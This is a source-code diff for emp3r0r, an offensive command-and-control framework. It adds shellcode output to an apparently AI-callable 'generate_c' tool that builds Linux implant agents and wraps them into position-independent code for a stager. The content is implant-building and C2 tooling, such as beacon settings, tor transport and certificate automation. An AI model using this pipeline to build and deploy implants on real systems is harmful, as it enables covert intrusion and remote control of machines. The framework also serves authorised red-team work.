@@ -8,6 +8,8 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/detection"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/modules"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -83,7 +85,7 @@ func (a *Actions) generateTools() map[string]Tool {
 				Type: "function",
 				Function: FunctionDef{
 					Name:        "generate_c",
-					Description: "Build the native C agent on this operator host. Screened, audited, and serialized with other builds. type is glibc (default) or musl; arch is amd64 (default), 386, arm, arm64, or riscv64; format is exe (default), so, or shellcode. format=shellcode is glibc+amd64 only and produces a malasada-wrapped raw PIC blob for stager_linux. transport is libcurl (default), http_raw, libssl, or tor; http_raw cannot use TLS, and a custom c2_channel_mode must match its transport. crypto is openssl (default) or mbedtls; gzip is miniz (default) or none; dynload is libc_dl (default for glibc), public, or auto, and musl forces public; glibc_version is 2.17 (default) or 2.34 and is ignored for musl. bof and rvvm default to true. Beacon defaults are interval 60, jitter 50, poll_window 5, offline_grace 0. Omit cc to use the configured C2 address; pass an explicit http(s) URL for TLS. Returns executed, agent_uuid, output_file, source_dir, config_size, endpoint, transport, channel_mode, warnings, opsec, and decision. For format=shellcode, pass output_file to stager_linux as agent-pic; for exe or so, output_file is the deployment artifact. Never execute build outputs on the operator host. Example: {\"type\":\"glibc\",\"arch\":\"amd64\",\"format\":\"shellcode\"} then module stager_linux with agent-pic=<output_file>. A cc name not covered by the C2 certificate is added automatically: the C2 adds the name, regenerates the certificate only when the SAN set changes, and reloads the in-process certificate used by new TLS/QUIC handshakes; it does not restart. An external TLS front proxy or CDN must still cover the name itself, and custom transports skip this certificate automation.",
+					Description: "Build the native C agent on this operator host. Screened, audited, and serialized with other builds. type is glibc (default) or musl; arch is amd64 (default), 386, arm, arm64, or riscv64; format is exe (default), so, or shellcode. format=shellcode is glibc+amd64 only: it builds the shared object and runs the editable malasada producer to produce raw PIC for stager_linux. transport is libcurl (default), http_raw, libssl, or tor; http_raw cannot use TLS, and a custom c2_channel_mode must match its transport. crypto is openssl (default) or mbedtls; gzip is miniz (default) or none; dynload is libc_dl (default for glibc), public, or auto, and musl forces public; glibc_version is 2.17 (default) or 2.34 and is ignored for musl. bof and rvvm default to true. Beacon defaults are interval 60, jitter 50, poll_window 5, offline_grace 0. Omit cc to use the configured C2 address; pass an explicit http(s) URL for TLS. Returns executed, agent_uuid, output_file, source_dir, config_size, endpoint, transport, channel_mode, warnings, opsec, and decision. For format=shellcode, pass output_file to stager_linux as agent-pic; for exe or so, output_file is the deployment artifact. Never execute build outputs on the operator host. Example: {\"type\":\"glibc\",\"arch\":\"amd64\",\"format\":\"shellcode\"} then module stager_linux with agent-pic=<output_file>. A cc name not covered by the C2 certificate is added automatically: the C2 adds the name, regenerates the certificate only when the SAN set changes, and reloads the in-process certificate used by new TLS/QUIC handshakes; it does not restart. An external TLS front proxy or CDN must still cover the name itself, and custom transports skip this certificate automation.",
 					Parameters: ObjectSchema(map[string]any{
 						"type": map[string]any{
 							"type":        "string",
@@ -300,6 +302,8 @@ func (a *Actions) runGoBuild(spec *goBuildSpec) map[string]any {
 		}
 		if res.ShellcodeErr != nil {
 			result["shellcode_error"] = res.ShellcodeErr.Error()
+		} else if spec.PayloadType == builder.PayloadTypeLinuxSO {
+			result["shellcode_note"] = "run the malasada producer module with output_file as input"
 		}
 	}
 	if err != nil {
@@ -498,7 +502,12 @@ func (a *Actions) runCBuild(spec *cBuildSpec) map[string]any {
 	a.generateMu.Lock()
 	defer a.generateMu.Unlock()
 
-	res, err := builder.GenerateCAgentWorkflow(spec.Config, spec.Providers, client.SignAgent)
+	requestedShellcode := spec.Providers.Format == "shellcode"
+	providers := spec.Providers
+	if requestedShellcode {
+		providers.Format = "so"
+	}
+	res, err := builder.GenerateCAgentWorkflow(spec.Config, providers, client.SignAgent)
 	endpoint := builder.CAgentEndpoint(live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort, spec.ChannelMode)
 	result := map[string]any{
 		"executed":     err == nil,
@@ -524,6 +533,14 @@ func (a *Actions) runCBuild(spec *cBuildSpec) map[string]any {
 		result["config_size"] = res.ConfigSize
 		outputFile = res.OutputFile
 		size = res.ConfigSize
+		if requestedShellcode {
+			pic, wrapErr := mcpWrapMalasada(res.OutputFile)
+			if wrapErr != nil {
+				result["shellcode_error"] = wrapErr.Error()
+			} else {
+				result["shellcode_file"] = pic
+			}
+		}
 	}
 	if err != nil {
 		result["error"] = err.Error()
@@ -660,4 +677,25 @@ func intOrDefault(value *int, fallback int) int {
 		return fallback
 	}
 	return *value
+}
+
+// mcpWrapMalasada runs the installed malasada producer on a C agent shared
+// object. The PIC wrapper is a module step, not part of the agent builder.
+func mcpWrapMalasada(soPath string) (string, error) {
+	dir := strings.TrimSpace(detection.DefaultLinuxProducerDirs()["malasada"])
+	if dir == "" {
+		return "", fmt.Errorf("the malasada producer is not installed")
+	}
+	output := strings.TrimSuffix(soPath, ".so") + ".bin"
+	buildLog, err := modules.BuildLocalModuleAt(dir, "malasada", map[string]string{
+		"input": soPath, "output": output, "call-export": "main", "compress": "on",
+	})
+	if err != nil {
+		return "", fmt.Errorf("malasada build: %w", err)
+	}
+	payloads := detection.ParseGeneratedPayloads(buildLog)
+	if len(payloads) == 0 {
+		return "", fmt.Errorf("malasada did not report a generated payload")
+	}
+	return payloads[len(payloads)-1].Path, nil
 }
